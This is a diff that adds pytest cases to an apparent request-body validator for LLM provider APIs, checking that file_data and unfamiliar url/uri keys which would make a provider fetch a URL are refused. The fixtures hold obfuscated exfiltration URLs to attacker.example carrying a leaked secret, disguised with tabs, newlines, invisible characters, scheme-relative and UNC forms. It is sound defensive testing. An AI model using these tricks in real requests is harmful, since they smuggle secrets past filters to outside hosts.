@@ -709,3 +709,55 @@ def test_the_engine_is_told_a_part_asks_the_provider_to_fetch_a_url(family: Wire
     assert LEAK not in answer and "attacker" not in answer
     assert r.ledger.failure is not None
     assert "a message part asks the provider to fetch a URL" in str(r.ledger.failure)
+
+
+# #950-T20: `file_data` passes only as base64 or a data: URI; every other text is refused,
+# whatever a provider's URL detection would make of it.
+@pytest.mark.parametrize(
+    "value",
+    [
+        "ht\ttps://attacker.example/a?" + LEAK,
+        "h\nttps://attacker.example/a?" + LEAK,
+        "\u00a0https://attacker.example/a?" + LEAK,
+        "\ufeffhttps://attacker.example/a?" + LEAK,
+        "//attacker.example/a?" + LEAK,
+        "\\\\attacker.example\\a?" + LEAK,
+        "www.attacker.example/a?" + LEAK,
+        "attacker.example/a?" + LEAK,
+    ],
+)
+@pytest.mark.parametrize("family", [CHAT, RESPONSES])
+def test_a_file_data_that_is_not_base64_is_refused(family: WireFamily, value: str) -> None:
+    part: dict[str, Any] = {"type": "input_file", "file_data": value}
+    if family is CHAT:
+        part = {"type": "file", "file": {"file_data": value}}
+    refused = check(family, body_of(family, user(part)))
+    assert refused is not None and str(refused.where).endswith("file_data (url source)")
+
+
+# #950-T21: base64 split over lines (as some encoders write it) still passes
+def test_base64_split_over_lines_passes_in_file_data() -> None:
+    value = "iVBORw0K\nGgoAAAAN\r\nSUhEUgAA"
+    assert check(CHAT, body_of(CHAT, user({"file": {"file_data": value}}))) is None
+
+
+# #950-T22: an unfamiliar `…url`/`…uri` key: a scheme split by a tab or a new line, a
+# scheme-relative address, a list of URLs and a plural key are refused too
+@pytest.mark.parametrize(
+    "part",
+    [
+        {"pdf_url": "ht\ttps://attacker.example/a?" + LEAK},
+        {"pdf_url": "//attacker.example/a?" + LEAK},
+        {"pdf_url": ["https://attacker.example/a?" + LEAK]},
+        {"image_urls": ["https://attacker.example/a?" + LEAK]},
+        {"source_uris": "https://attacker.example/a?" + LEAK},
+    ],
+)
+def test_an_unfamiliar_url_key_in_any_form_is_refused(part: dict[str, Any]) -> None:
+    assert check(CHAT, body_of(CHAT, user(part))) is not None
+
+
+# #950-T23: a `type` that is not a text is a refused request, not a crash of the walk
+def test_a_type_that_is_not_a_text_is_refused_not_a_crash() -> None:
+    refused = check(CHAT, body_of(CHAT, user({"type": [], "input": "x"})))
+    assert refused is None or refused.code is not None
